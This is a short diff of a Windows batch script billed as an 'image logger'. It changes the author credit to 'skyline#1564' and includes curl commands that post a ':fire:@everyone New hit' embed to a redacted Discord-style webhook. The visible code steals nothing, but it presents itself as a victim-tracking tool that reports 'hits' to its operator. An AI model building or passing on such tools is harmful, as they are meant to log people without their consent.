@@ -1,7 +1,7 @@
 @echo off
-title image logger by iluv911gt3rs.
+title image logger by skyline#1564.
 color 9
-echo Image logger made by iluv911gt3rs
+echo Image logger made by skyline#1564
 timeout /T 3 /NOBREAK > nul
 cls
 color 2
@@ -63,7 +63,7 @@ cls
 echo Check your discord for the image.
 timeout /T 3 /NOBREAK > nul
 cls
-curl -H "Content-Type: application/json" -X POST -d "{\"content\":\":fire:@everyone New hit:fire:\",\"embeds\":[{\"title\":\":sunglasses:Image logger by Ahoj:sunglasses:\",\"description\":\":white_check_mark: Image: https://cdn.discordapp.com/attachments/1009373563217784835/1066654772842725376/Png.png\",\"color\":16711680}]}" xxx
+curl -H "Content-Type: application/json" -X POST -d "{\"content\":\":fire:@everyone New hit:fire:\",\"embeds\":[{\"title\":\":sunglasses:Image logger by skyline#1564:sunglasses:\",\"description\":\":white_check_mark: Image: https://cdn.discordapp.com/attachments/1009373563217784835/1066654772842725376/Png.png\",\"color\":16711680}]}" xxx
 pause
 goto start
 
@@ -71,7 +71,7 @@ goto start
 
 
 @echo off
-curl -H "Content-Type: application/json" -X POST -d "{\"content\":\":fire:@everyone New hit:fire:\",\"embeds\":[{\"title\":\":sunglasses:Image logger by Ahoj:sunglasses:\",\"description\":\":white_check_mark: Image: https://cdn.discordapp.com/attachments/1009373563217784835/1066654772842725376/Png.png\",\"color\":16711680}]}" xxx
+curl -H "Content-Type: application/json" -X POST -d "{\"content\":\":fire:@everyone New hit:fire:\",\"embeds\":[{\"title\":\":sunglasses:Image logger by skyline#1564:sunglasses:\",\"description\":\":white_check_mark: Image: https://cdn.discordapp.com/attachments/1009373563217784835/1066654772842725376/Png.png\",\"color\":16711680}]}" xxx
 pause
 
 
